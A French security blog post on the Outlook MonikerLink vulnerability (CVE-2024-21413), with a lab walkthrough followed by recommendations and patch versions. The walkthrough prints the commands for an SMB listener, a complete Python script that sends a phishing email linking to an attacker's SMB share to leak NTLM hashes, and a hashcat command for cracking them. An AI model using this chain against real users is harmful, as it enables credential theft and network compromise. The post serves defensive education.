---
title : "Compromettre Microsoft Outlook via l'ouverture d'un simple Email  : CVE-2024-21413 (Exécution de code arbitraire)"
date : 2024-02-18T19:00:56Z
draft : false
images: [/images/Outlook-CVE-2024-21413.jpg]
featuredImage : '/images/Outlook-CVE-2024-21413.jpg'
featuredImagePreview : '/images/Outlook-CVE-2024-21413.jpg'
---


## Introduction

CVE-2024-21413 baptisée MonikerLink est une vulnérabilité critique qui permet à un attaquant non authentifié de divulguer le condensat (hash) NTLM local et potentiellement une exécution de code arbitraire à distance. Son exploitation nécessite une intervention de l'utilisateur.

Avec un niveau de criticité de 9,8 sur (CVSS), elle représente l'une des menaces les plus sérieuses récemment révélées.  Cette vulnérabilité ouvre la porte à des cyberattaques sophistiquées, allant du vol de données au déploiement de rançongiciels à travers le réseau d'une organisation.

La liste des versions vulnérables :

* Microsoft Office 2016
* Microsoft Office LTSC 2021
* Microsoft 365 Apps for Enterprise
* Microsoft Office 2019

## Comment ça marche ?

La CVE-2024-21413 utilise le "Outlook Preview Pane"  pour lancer des attaques. Normalement, Microsoft Office utilise la vue protégée (Protected View) pour empêcher les documents potentiellement dangereux d'exécuter du code sans l'accord de l'utilisateur. Mais cette faille contourne ces protections, permettant au code malveillant de s'exécuter dès qu'on ouvre le mail en aperçu.

## Exploitation de la vulnérabilité CVE-2024-21413

Un POC disponible sur (https://github.com/CMNatic/CVE-2024-21413)  décrit les étapes pour exploiter CVE-2024-21413, en utilisant l'authentification SMTP pour envoyer un e-mail qui contourne les vérifications de sécurité courantes.

Le script nécessite des paramètres tels que les détails du serveur SMTP, les adresses e-mail de l'expéditeur et du destinataire, ainsi que l'URL malveillante

Cette démonstration illustre concrètement comment les attaquants pourraient exploiter cette vulnérabilité pour exécuter du code à distance sur le système d'une victime sans éveiller de soupçons.

### Etape 1 : Mise en place d'un listener

D'abord on lance un SMB Listener avec la commande impacket-smbserver. On peut aussi lancer un listener avec la commande responder en spécifiant l'interface d'écoute.

```
impacket-smbserver -smb2support -ip 0.0.0.0 test /tmp 
```
ou 
```
responder -I eth0
```

![Lance un listener](/images/step1_outlook-rce.png)



### Etape 2 : Envoi initial

On envoie l'Email en utilisant le serveur SMTP spécifié et en ciblant le destinataire avec un message élaboré contenant le lien malveillant.

* attacker@monikerlink.thm est le mail de l'attaquant
* victim@monikerlink.thm est le mail de la victiome

Le code exploit.py
```
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://192.168.1.6/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('ZalePentester', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('monikerlink.thm', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```


![Envoi email](/images/step2_outlook-rce.png)

### Etape 3 : Reception du mail par la victime

La victime reçoit l'e-mail dans Outlook sans aucun avertissement ni restriction, démontrant le contournement du Protected View .

![Reception email](/images/step3_outlook-rce.png)

### Etape 4 : Ouverture du lien malveillant par la victime

Lorsque la victime clique sur le lien , l'attaquant intercepte les identifiants NTLM. Ce qui constitue une violation de sécurité critique pouvant conduire à une compromission réseau totale.

![Interception Hash](/images/step4_outlook-rce.png)


### Etape 5 : Interception des informations NTLM

Après avoir recupéré le hash, on peut cracker le mot de passe en utilisant un dictionnaire de mot de passe.
```
hashcat -a 0 -m 5600 hash.txt rockyou.txt -o cracked.txt -O
```
![Interception Hash](/images/step5_outlook-rce.png)

Avec un peu de chance, on peut cracker le mot de passe d'ou la necessité d'avoir un très bon dictionnaire.

![Interception Hash](/images/step6_outlook-rce.png)


## Démonstration

Dans cette vidéo, nous allons faire la démonstration d'un exemple d'exploitation réussie.

{{< youtube Qvooiddg9DM >}}


## Comment la CVE-2024-21413 peut mener à l'exécution de code arbitraire à distance ?
Le Chercheur @xaitax  a publié une vidéo démontrant comment cette vulnérabilité pourrait mener à une exécution de code arbitraire à distance. L'exploit n'est pas encore disponible au public. 

{{< tweet 1759318090788037093 >}}

## Recommandations

Les mesures suivantes sont également recommandées pour renforcer la sécurité :

* Mise à Jour Régulière : Assurez-vous que votre suite Microsoft Office est à jour avec les derniers correctifs de sécurité.

* Sensibiliser les Utilisateurs : Informez les utilisateurs sur les risques des e-mails de phishing et l'importance de la prudence lorsqu'ils traitent des e-mails inattendus.

* Mettre en Place des Solutions de Sécurité Avancées : Utilisez des solutions de sécurité e-mail qui offrent des capacités de protection avancées contre les menaces, y compris l'analyse des pièces jointes et des liens des e-mails pour détecter les contenus malveillants.

## Correctifs

Les corrections sont disponibles dans l'une de ces versions de Microsoft Office :

* Office 2021 : Version 2401 (Build 17231.20236)
* Office LTSC 2021 : Version 2108 (Build 14332.20637)
* Office 2019 : Version 2401 (Build 17231.20236)
* Office 2019 (Volume Licensed) : Version 1808 (Build 10407.20032)
* Office 2016 : Version 2401 (Build 17231.20236)

Pour Microsoft 365 Apps, voici la liste des versions avec correctifs :

* Current Channel : Version 2401 (Build 17231.20236)
* Monthly Enterprise Channel : Version 2312 (Build 17126.20190)
* Monthly Enterprise Channel : Version 2311 (Build 17029.20178)
* Semi-Annual Enterprise Channel (Preview) : Version 2308 (Build 16731.20550)
* Semi-Annual Enterprise Channel : Version 2308 (Build 16731.20550)
* Semi-Annual Enterprise Channel : Version 2302 (Build 16130.20916)
* Semi-Annual Enterprise Channel : Version 2208 (Build 15601.20870)

Références :

 * https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-21413

 * https://github.com/CMNatic/CVE-2024-21413

 * https://github.com/duy-31/CVE-2024-21413

 * https://twitter.com/xaitax/status/1759318090788037093
